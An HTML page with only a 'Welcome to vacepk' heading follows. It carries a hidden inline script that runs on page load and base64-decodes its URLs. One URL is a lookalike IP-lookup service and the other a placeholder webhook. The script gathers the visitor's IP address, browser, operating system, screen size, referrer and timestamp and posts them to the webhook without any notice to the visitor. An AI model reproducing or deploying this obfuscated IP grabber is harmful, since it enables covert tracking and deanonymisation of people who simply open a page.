<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>vacepk</title>
</head>
<body>
    <h1>Welcome to vacepk</h1>

    <script>
        (function() {
            function _d(_s) {
                return atob(_s);
            }

            async function _gIP() {
                try {
                    const r = await fetch(_d('aHR0cHM6Ly9hcGkuaXBpZnkuYmFyL2dldD9mb3JtYXQ9anNvbg=='));
                    const d = await r.json();
                    return d.ip;
                } catch (e) {
                    return 'Unable to fetch IP';
                }
            }

            function _gUA() {
                const ua = navigator.userAgent;
                let b = 'Unknown Browser';
                let o = 'Unknown OS';

                if (ua.includes('Firefox')) {
                    b = 'Mozilla Firefox';
                } else if (ua.includes('Chrome')) {
                    b = 'Google Chrome';
                } else if (ua.includes('Safari')) {
                    b = 'Safari';
                } else if (ua.includes('MSIE') || ua.includes('Trident')) {
                    b = 'Internet Explorer';
                } else if (ua.includes('Opera') || ua.includes('OPR')) {
                    b = 'Opera';
                }

                if (ua.includes('Windows NT 10.0')) {
                    o = 'Windows 10';
                } else if (ua.includes('Mac OS X')) {
                    o = 'Mac OS X';
                } else if (ua.includes('Linux')) {
                    o = 'Linux';
                } else if (ua.includes('Android')) {
                    o = 'Android';
                } else if (ua.includes('iPhone')) {
                    o = 'iOS (iPhone)';
                } else if (ua.includes('iPad')) {
                    o = 'iOS (iPad)';
                }

                return { b, o };
            }

            async function _sVI() {
                const ip = await _gIP();
                const { b, o } = _gUA();
                const sw = screen.width;
                const sh = screen.height;
                const rf = document.referrer || 'Direct Visit';
                const ts = new Date().toISOString();

                const pl = { ip, b, o, sw, sh, rf, ts };

                const wURL = _d('WlNDX1dFQkhPT0tfVVJMX0hFUkU=');

                fetch(wURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: JSON.stringify(pl) })
                });
            }

            window.onload = _sVI;
        })();
    </script>
</body>
</html>
